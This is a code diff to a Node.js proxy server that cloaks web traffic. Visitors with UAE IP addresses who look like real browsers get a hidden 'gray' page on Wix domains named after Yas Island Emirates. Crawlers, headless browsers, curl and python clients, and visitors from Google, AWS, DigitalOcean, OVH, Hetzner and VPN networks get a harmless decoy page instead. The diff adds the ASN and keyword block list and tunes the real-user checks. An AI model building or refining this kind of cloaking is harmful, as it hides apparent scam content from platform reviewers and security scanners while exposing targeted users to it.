@@ -11,7 +11,6 @@ const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.
 const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";
 
 const UAE_COUNTRY_CODE = "AE";
-const GEO_API_URL = "http://ip-api.com/json/";
 
 // --- Trust proxy for correct IP detection ---
 app.set("trust proxy", true);
@@ -32,6 +31,29 @@ const SUSPICIOUS_AGENTS = [
   "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
 ];
 
+// --- Blocked ASN/Org List ---
+function isBlockedASN(asn, orgName) {
+  const BLOCKED_ASNS = [
+    "AS15169", // Google
+    "AS16509", // AWS
+    "AS14061", // DigitalOcean
+    "AS9009",  // M247
+    "AS24940", // Hetzner
+    "AS61317", // OVH
+    "AS12876", // Online.net
+    "AS14618"  // Amazon legacy
+  ];
+
+  const BLOCKED_KEYWORDS = [
+    "google", "amazon", "aws", "digitalocean", "ovh", "m247", "hetzner", "vpn"
+  ];
+
+  const asnBlocked = asn && BLOCKED_ASNS.includes(asn.toUpperCase());
+  const orgBlocked = orgName && BLOCKED_KEYWORDS.some(word => orgName.toLowerCase().includes(word));
+
+  return asnBlocked || orgBlocked;
+}
+
 // --- Bot Detection Function ---
 async function isBot(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
@@ -51,7 +73,7 @@ async function isBot(req) {
   return isGoogle;
 }
 
-// --- Google IP Detection ---
+// --- Check if IP is Google Related ---
 async function isGoogleRelatedIP(ip) {
   return new Promise(resolve => {
     if (!ip) return resolve(false);
@@ -80,6 +102,7 @@ function isLikelyRealUser(req) {
 
   const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
   const hasReferrer = headers["referer"] || headers["referrer"];
+  // Removed cookie requirement for better social media support
 
   return (
     ua.includes("mozilla") &&
@@ -87,12 +110,11 @@ function isLikelyRealUser(req) {
     !ua.includes("bot") &&
     !ua.includes("google") &&
     !isSuspicious &&
-    hasReferrer // ✅ فقط هذا الشرط يكفي الآن
-    // no need for: && headers["cookie"]
+    hasReferrer
   );
 }
 
-// --- Proxy Function ---
+// --- Proxy Content ---
 async function proxyContent(targetUrl, req, res) {
   try {
     const headersToForward = {
@@ -142,15 +164,18 @@ app.all("*", async (req, res) => {
   const ua = req.headers["user-agent"] || "no-agent";
   const path = req.originalUrl;
   const referrer = req.headers["referer"] || req.headers["referrer"] || "none";
-  const cookie = req.headers["cookie"] || "none";
 
   let countryCode = null;
+  let asn = null;
+  let orgName = null;
 
   try {
-    const geo = await axios.get(`${GEO_API_URL}${ip}`);
-    if (geo.data?.status === "success") {
-      countryCode = geo.data.countryCode;
-    }
+    const ipData = await axios.get(`https://ipapi.co/${ip}/json/`);
+    countryCode = ipData.data.country_code;
+    asn = ipData.data.asn;
+    orgName = ipData.data.org;
+
+    console.log(`🌍 IP Info - IP: ${ip} | Country: ${countryCode} | ASN: ${asn} | Org: ${orgName}`);
   } catch (err) {
     console.error(`🌐 GeoIP lookup failed for IP ${ip}:`, err.message);
   }
@@ -158,23 +183,18 @@ app.all("*", async (req, res) => {
   const isFromUAE = countryCode === UAE_COUNTRY_CODE;
   const isDetectedBot = await isBot(req);
   const isRealUser = isLikelyRealUser(req);
+  const isASNBlocked = isBlockedASN(asn, orgName);
 
-  // ✅ Debug log
-  console.log(`\n📥 Incoming Visitor`);
-  console.log(`- IP: ${ip}`);
-  console.log(`- Country: ${countryCode || "Unknown"}`);
-  console.log(`- UA: ${ua}`);
-  console.log(`- Referrer: ${referrer !== "none" ? referrer : "⛔️ None"}`);
-  console.log(`- Has Cookie: ${cookie !== "none" ? "✅ Yes" : "❌ No"}`);
-  console.log(`- isBot: ${isDetectedBot}`);
-  console.log(`- isRealUser: ${isRealUser}`);
-  console.log(`- Final Decision: ${isFromUAE && !isDetectedBot && isRealUser ? "➡️ GRAY_PAGE" : "🔒 SAFE_PAGE"}`);
+  console.log(`🔎 Referrer: ${referrer}`);
+  console.log(`🧠 Decision: From UAE? ${isFromUAE} | Bot? ${isDetectedBot} | Real User? ${isRealUser} | ASN Blocked? ${isASNBlocked}`);
 
   await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));
 
-  if (isFromUAE && !isDetectedBot && isRealUser) {
+  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked) {
+    console.log("✅ Redirecting to GRAY_PAGE");
     await proxyContent(GRAY_PAGE, req, res);
   } else {
+    console.log("🔒 Redirecting to SAFE_PAGE");
     await proxyContent(SAFE_PAGE, req, res);
   }
 });
